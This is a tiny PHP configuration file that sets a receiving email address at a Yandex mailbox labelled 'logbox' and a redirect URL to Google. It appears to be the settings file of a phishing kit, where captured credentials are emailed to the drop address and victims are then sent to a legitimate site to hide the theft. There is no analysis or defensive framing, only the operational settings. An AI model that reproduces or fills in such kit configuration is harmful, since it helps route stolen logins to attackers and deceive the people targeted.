<?php 
$Receive_email="logbox0122@yandex.com";
$redirect="https://www.google.com/";
?>